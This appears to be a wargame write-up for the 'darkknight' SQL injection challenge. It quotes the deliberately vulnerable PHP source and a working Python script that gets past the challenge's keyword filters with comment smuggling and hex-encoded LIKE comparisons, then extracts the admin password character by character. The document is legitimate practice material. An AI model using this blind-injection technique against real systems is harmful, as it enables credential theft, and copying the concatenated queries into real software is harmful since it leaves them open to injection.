'''
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
  if(preg_match('/\'|substr|ascii|=/i', $_GET[no])) exit("HeHe"); 
  $query = "select id from prob_darkknight where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_darkknight where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("darkknight"); 
  highlight_file(__FILE__); 
?>
'''
import requests
from urllib import parse

host = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?"
cookies = {"PHPSESSID" : "8s7khiq67rue3qlsffsskni093"}
password_length = 0
s = requests.Session()


# 주석을 활용해서 뚫어야함
# pw = /*
# no = */ or 1
# no 에는 / 에 필터링이 걸려있으므로 아스키코드 활용 (0x2a2f0a)
# = 도 안되고, '' 도 안되므로 무조건 아스키임 admin = 0x61646d696e

print("password length find start!!")
for i in range(1, 50) :    
    # pw=/*&no=0x2a2f0a or id like 0x61646d696e and length(pw) > 9
    param = f"pw=/*&no=0x2a2f0a or id like 0x61646d696e and length(pw) > {i}"
    res = s.get(host + (param), cookies=cookies)
    if "Hello admin" not in res.text :
        print(f"password length is {i}")
        password_length = i
        break 
print("password length find end !!")

print("password inject start !! ")
origin_pwd = ""
hex_pwd = "0x"
for i in range(1, password_length + 1) :
    for j in range(47, 123) : # 48~57 0~9 / 65 ~90 A-Z 97~122 a-z    
        hexData = chr(j).encode("utf-8").hex() + "%".encode("utf-8").hex()
        param = f"pw=/*&no=0x2a2f0a or id like 0x61646d696e and pw like {hex_pwd}{hexData}"
        res = s.get(host + param, cookies=cookies)
        if "No Hack ~_~" in res.text :
          print("no use prob keyword")
          break
        if "Hello admin" in res.text :
          origin_pwd += chr(j)
          hex_pwd += chr(j).encode("utf-8").hex()           
          break
    print(f"now password ... {origin_pwd}")
print("password inject end !! ")

# 0b70ea1f